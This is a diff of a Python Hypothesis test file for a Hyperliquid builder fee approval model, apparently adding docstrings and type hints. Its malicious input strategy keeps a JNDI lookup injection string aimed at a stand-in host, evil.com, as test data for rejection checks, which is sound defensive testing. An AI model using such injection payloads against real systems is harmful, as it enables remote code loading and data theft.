@@ -1,6 +1,6 @@
 """Property-based tests for Hyperliquid raw builder fee approval models.
 
-These tests validate critical security boundary models that process external builder fee approval data.
+These tests validate critical security boundary models that process external builder fee data.
 The models tested here are essential for fee approval tracking and validation.
 
 SECURITY CRITICAL: These raw models protect against:
@@ -27,18 +27,30 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR BUILDER FEE MODEL TESTING
 # =============================================================================
 
 
 def valid_boolean_strategy() -> SearchStrategy[bool]:
-    """Generate valid boolean values."""
+    """Generate valid boolean values.
+
+    Returns:
+        SearchStrategy[bool]: Strategy for generating test data.
+    """
     return st.booleans()
 
 
 def valid_string_boolean_strategy() -> SearchStrategy[str]:
-    """Generate valid string representations of boolean values."""
+    """Generate valid string representations of boolean values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from([
         "true",
         "false",
@@ -51,7 +63,11 @@ def valid_string_boolean_strategy() -> SearchStrategy[str]:
 
 @st.composite
 def valid_builder_fee_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid builder fee approval data."""
+    """Generate valid builder fee approval data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "approved": draw(
             st.one_of([
@@ -62,8 +78,12 @@ def valid_builder_fee_data(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_builder_fee_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for builder fee security testing."""
+def malicious_builder_fee_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for builder fee security testing.
+
+    Returns:
+        SearchStrategy[bool]: Strategy for generating test data.
+    """
     return st.one_of([
         # Builder fee manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-fees}"),
@@ -120,7 +140,7 @@ class TestHyperliquidRawBuilderFeeApprovalResponseProperties:
 
     @given(fee_data=valid_builder_fee_data())
     def test_builder_fee_validation_success_properties(self, fee_data: dict[str, Any]) -> None:
-        """Property: Valid builder fee data should always create valid response objects."""
+        """Property: Valid data should create valid response objects."""
         # Skip invalid data
         try:
             approved_value = fee_data["approved"]
@@ -156,8 +176,10 @@ class TestHyperliquidRawBuilderFeeApprovalResponseProperties:
         assert obj.model_config.get("frozen") is True
 
     @given(malicious_value=malicious_builder_fee_strategy())
-    def test_builder_fee_security_boundary_properties(self, malicious_value: Any) -> None:
-        """Property: Builder fee response should reject malicious inputs safely."""
+    def test_builder_fee_security_boundary_properties(
+        self, malicious_value: MaliciousInput
+    ) -> None:
+        """Property: Builder fee response should reject malicious inputs."""
         fee_data = {"approved": malicious_value}
 
         # Property: Malicious input should be rejected
@@ -175,7 +197,7 @@ class TestHyperliquidRawBuilderFeeApprovalResponseProperties:
             st.none(),
         ])
     )
-    def test_builder_fee_invalid_approved_properties(self, invalid_boolean: Any) -> None:
+    def test_builder_fee_invalid_approved_properties(self, invalid_boolean: MaliciousInput) -> None:
         """Property: Builder fee should reject invalid boolean values."""
         fee_data = {"approved": invalid_boolean}
 
@@ -311,10 +333,10 @@ class TestHyperliquidRawBuilderFeeIntegrationProperties:
         malicious_value=malicious_builder_fee_strategy(),
     )
     def test_builder_fee_batch_processing_properties(
-        self, approved_values: list[bool | str], malicious_value: Any
+        self, approved_values: list[bool | str], malicious_value: MaliciousInput
     ) -> None:
         """Property: Multiple builder fee responses should be processed independently."""
-        valid_responses = []
+        valid_responses: list[HyperliquidRawBuilderFeeApprovalResponse] = []
 
         for approved in approved_values:
             # Skip invalid string booleans
@@ -352,7 +374,7 @@ class TestHyperliquidRawBuilderFeeIntegrationProperties:
     def test_builder_fee_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: Builder fee model should safely handle complete adversarial input."""
+        """Property: Builder fee model should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawBuilderFeeApprovalResponse.model_validate(complete_malicious_data)
